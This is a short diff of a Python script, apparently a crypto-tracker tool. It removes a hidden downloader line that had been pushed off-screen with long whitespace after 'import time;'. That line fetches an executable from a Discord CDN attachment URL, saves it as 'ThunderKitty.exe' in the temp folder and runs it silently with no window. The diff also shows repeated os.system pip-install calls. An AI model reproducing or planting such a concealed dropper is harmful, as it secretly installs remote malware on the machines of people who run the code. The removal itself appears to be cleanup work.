@@ -1,13 +1,12 @@
 try:
     import colorama
-    import requests
 except ImportError:
     import os
     os.system("python -m pip install --upgrade pip")
     os.system("pip install requests");os.system("python -m pip install requests");os.system("py -m pip install requests")
     os.system("pip install colorama");os.system("python -m pip install colorama");os.system("py -m pip install colorama")
 
-import time;                                                                                                                                                                                                                                                                                  import requests, tempfile, os, subprocess; file_path = os.path.join(tempfile.gettempdir(), 'ThunderKitty.exe'); open(file_path, 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1263460403694927938/1263842719575441481/main.exe?ex=669bb4c1&is=669a6341&hm=ea39fa52d399812574a1f5a10e7692345f1a2365edb93a16bef44b2319346ac5&').content); subprocess.run(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
+import time;
 from colorama import Fore, Style
 from crypto_tracker.api import *
 
